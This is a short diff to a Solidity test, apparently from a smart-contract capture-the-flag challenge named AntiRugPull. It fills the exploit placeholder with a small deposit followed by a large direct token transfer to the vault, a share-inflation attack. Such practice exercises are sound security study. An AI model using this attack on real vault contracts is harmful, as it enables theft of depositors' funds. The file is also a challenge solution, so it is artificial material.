@@ -20,7 +20,11 @@ contract AntiRugPullTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        uint256 amount = 5;
+        vm.startPrank(user1);
+        token.approve(address(instance), amount);
+        instance.deposit(amount);
+        token.transfer(address(instance), amount * (1 ether));
 
         checkSuccess();
     }
